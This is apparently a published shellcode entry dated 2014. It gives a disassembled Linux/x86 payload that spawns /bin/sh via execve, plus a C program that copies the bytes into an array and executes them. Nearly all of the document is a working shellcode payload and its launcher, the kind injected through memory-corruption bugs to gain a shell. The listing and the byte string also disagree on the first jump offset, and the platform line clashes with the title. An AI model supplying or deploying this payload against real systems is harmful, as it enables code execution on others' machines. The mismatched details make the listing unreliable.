/*
; Title: Linux/x86 execve "/bin/sh" - shellcode 35 bytes
; Platform: linux/x86_64
; Date: 2014-06-26
; Author: Mohammad Reza Espargham
; Simple ShellCode

section .text:

08048060 <_start>:
  8048060:    eb 17                    jmp    8048079

08048062 :
  8048062:    5e                       pop    %esi
  8048063:    31 d2                    xor    %edx,%edx
  8048065:    52                       push   %edx
  8048066:    56                       push   %esi
  8048067:    89 e1                    mov    %esp,%ecx
  8048069:    89 f3                    mov    %esi,%ebx
  804806b:    31 c0                    xor    %eax,%eax
  804806d:    b0 0b                    mov    $0xb,%al
  804806f:    cd 80                    int    $0x80
  8048071:    31 db                    xor    %ebx,%ebx
  8048073:    31 c0                    xor    %eax,%eax
  8048075:    40                       inc    %eax
  8048076:    cd 80                    int    $0x80

08048078 :
  8048078:    e8 e5 ff ff ff           call   8048062
  804807d:    2f                       das
  804807e:    62 69 6e                 bound  %ebp,0x6e(%ecx)
  8048081:    2f                       das
  8048082:    73 68                    jae    80480ec
*/


#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

#define PAGE_SIZE 4096U


char code[] = {
     "\xeb\x16\x5e\x31\xd2\x52\x56\x89\xe1\x89\xf3\x31\xc0\xb0\x0b\xcd"
     "\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69"
     "\x6e\x2f\x73\x68"
};

int
main() {

printf("Shellcode Length:  %d\n", (int)strlen(code));
int (*ret)() = (int(*)())code;
ret();

return 0;
}